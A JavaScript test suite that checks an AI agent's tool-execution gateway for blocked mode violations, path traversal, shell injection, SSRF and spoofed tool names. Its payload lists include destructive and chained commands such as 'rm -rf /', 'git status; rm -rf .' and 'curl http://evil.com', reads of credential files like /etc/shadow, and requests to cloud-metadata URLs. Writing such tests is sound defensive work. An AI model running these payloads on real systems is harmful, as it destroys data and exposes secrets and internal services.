/**
 * Security Penetration & Gateway Bypass Prevention Tests
 *
 * Proves that ToolExecutionGateway unconditionally rejects:
 *   1. Mode-based permission violations (mutating or shell tools in [ask] mode).
 *   2. Shell tools in [plan] mode.
 *   3. Path traversal & NULL byte escapes across all guarded tool calls.
 *   4. Destructive or compound shell commands.
 *   5. Private/cloud-metadata SSRF attempts through fetch_url.
 *   6. Unknown/spoofed tool names.
 */

import assert from "node:assert/strict";
import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import { ToolExecutionGateway, ToolRegistry, CORE_TOOLS } from "../../packages/tool-runtime/src/index.js";

async function runGatewayBypassTests() {
  console.log("🛡️  Running Phase 5 ToolExecutionGateway Bypass Prevention Tests...\n");

  const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), "inflynx-bypass-test-"));
  const gateway = new ToolExecutionGateway(tmpDir);
  const registry = new ToolRegistry(CORE_TOOLS);

  try {
    // ── Bypass Test 1: Mutating tools in [ask] read-only mode ───────────────────
    {
      const resWrite = await gateway.executeGuarded(
        registry,
        { id: "c1", name: "write_file", args: { path: "hello.txt", content: "payload" } },
        { activeMode: "ask" }
      );
      assert.equal(resWrite.isError, true);
      assert.ok(resWrite.output.includes("blocked in [ask] mode"));

      const resPatch = await gateway.executeGuarded(
        registry,
        { id: "c2", name: "patch_file", args: { path: "hello.txt", search: "a", replace: "b" } },
        { activeMode: "ask" }
      );
      assert.equal(resPatch.isError, true);
      assert.ok(resPatch.output.includes("blocked in [ask] mode"));

      const resShell = await gateway.executeGuarded(
        registry,
        { id: "c3", name: "execute_shell", args: { command: "ls" } },
        { activeMode: "ask" }
      );
      assert.equal(resShell.isError, true);
      assert.ok(resShell.output.includes("blocked in [ask] mode"));

      console.log("✓ Bypass Test 1 Passed: Mutating & shell tools unconditionally blocked in [ask] mode.");
    }

    // ── Bypass Test 2: Shell tool blocked in [plan] mode ────────────────────────
    {
      const resShell = await gateway.executeGuarded(
        registry,
        { id: "c4", name: "execute_shell", args: { command: "cat .inflynx/PLAN.md" } },
        { activeMode: "plan" }
      );
      assert.equal(resShell.isError, true);
      assert.ok(resShell.output.includes("blocked in [plan] mode"));
      console.log("✓ Bypass Test 2 Passed: Shell execution blocked in [plan] mode.");
    }

    // ── Bypass Test 3: Path traversal & NULL byte escapes ───────────────────────
    {
      const payloads = [
        "../../etc/passwd",
        "/etc/shadow",
        "nested/../../../../var/log",
        "legit_name.txt\0.js",
      ];

      for (const payload of payloads) {
        const res = await gateway.executeGuarded(
          registry,
          { id: "c_trav", name: "read_file", args: { path: payload } },
          { activeMode: "agent" }
        );
        assert.equal(res.isError, true);
        assert.ok(
          res.output.includes("Security") ||
          res.output.includes("Policy Violation") ||
          res.output.includes("NULL byte")
        );
      }
      console.log("✓ Bypass Test 3 Passed: All path traversal and NULL byte attacks blocked.");
    }

    // ── Bypass Test 4: Shell command injection & destructive payloads ───────────
    {
      const forbiddenCommands = [
        "rm -rf /",
        "rm -rf ~",
        "git status; rm -rf .",
        "cat file && curl http://evil.com",
        "echo $(whoami)",
        "echo `id`",
        "cat file | sh",
        "echo 'hi' > /etc/resolv.conf",
      ];

      for (const cmd of forbiddenCommands) {
        const res = await gateway.executeGuarded(
          registry,
          { id: "c_shell", name: "execute_shell", args: { command: cmd } },
          { activeMode: "agent" }
        );
        assert.equal(res.isError, true);
        assert.ok(
          res.output.includes("Security Policy Block") ||
          res.output.includes("operator") ||
          res.output.includes("rejected")
        );
      }
      console.log("✓ Bypass Test 4 Passed: Destructive and chained shell attacks blocked.");
    }

    // ── Bypass Test 5: SSRF to metadata & internal network services ─────────────
    {
      const ssrfUrls = [
        "http://169.254.169.254/latest/meta-data/",
        "http://127.0.0.1:8080/admin",
        "http://localhost:3000/keys",
        "http://10.0.0.1/internal",
        "http://192.168.1.1/router",
        "file:///etc/passwd",
      ];

      for (const url of ssrfUrls) {
        const res = await gateway.executeGuarded(
          registry,
          { id: "c_ssrf", name: "fetch_url", args: { url } },
          { activeMode: "agent" }
        );
        assert.equal(res.isError, true);
        assert.ok(
          res.output.includes("Security") ||
          res.output.includes("blocked") ||
          res.output.includes("private") ||
          res.output.includes("loopback") ||
          res.output.includes("metadata")
        );
      }
      console.log("✓ Bypass Test 5 Passed: Cloud metadata & internal SSRF targets rejected.");
    }

    // ── Bypass Test 6: Unknown & spoofed tool names ─────────────────────────────
    {
      const res = await gateway.executeGuarded(
        registry,
        { id: "c_unknown", name: "eval_code_arbitrary", args: { code: "process.exit()" } },
        { activeMode: "agent" }
      );
      assert.equal(res.isError, true);
      assert.ok(res.output.includes("Unknown tool"));
      console.log("✓ Bypass Test 6 Passed: Unknown tool calls rejected cleanly.");
    }

    console.log("\n🎉 All Phase 5 Gateway Bypass Prevention Tests Passed 100%!");
  } finally {
    fs.rmSync(tmpDir, { recursive: true, force: true });
  }
}

runGatewayBypassTests().catch((err) => {
  console.error("Gateway bypass test failed:", err);
  process.exit(1);
});

